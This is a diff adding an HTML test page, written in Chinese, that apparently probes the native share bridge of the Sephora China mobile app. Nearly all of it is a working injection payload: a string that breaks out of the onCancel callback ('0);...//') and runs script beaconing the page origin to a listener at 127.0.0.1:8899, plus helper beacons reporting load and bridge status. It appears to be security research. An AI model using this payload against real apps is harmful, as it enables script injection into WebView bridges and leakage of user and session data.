@@ -1,0 +1,18 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>cancel-test</title></head>
+<body style="background:#111;color:#0f0;font-family:monospace;padding:16px;font-size:14px">
+<h3 style="color:#c9a96e">onCancel 隔离测试</h3>
+<p style="color:#fff;font-size:16px">分享面板即将弹出<br>请点 <b>取消/关闭/空白处</b> 关掉它</p>
+<div id="log"></div>
+<script>
+window.sep={_onSuccess:function(){},_onFailure:function(){},_onCancel:function(){}};
+function B(t,d){new Image().src='http://127.0.0.1:8899/x?t='+t+'&d='+encodeURIComponent(d||'').substring(0,200)}
+B('load',location.href);
+if(typeof appHandler!=='undefined'){
+  // 三个sink都带同一载荷: 哪个触发都能看到
+  var P="0);new Image().src='http://127.0.0.1:8899/x?t=SINK-FIRED&d='+encodeURIComponent(location.origin);//";
+  appHandler.appMonitorScript('shareApp',P,'{"title":"点取消试试","content":"c","shareUrl":"https://m.sephora.cn/"}');
+  B('armed','');
+  document.getElementById('log').innerHTML='已arm shareApp — 请操作分享面板';
+}else{B('nobridge','')}
+</script></body></html>
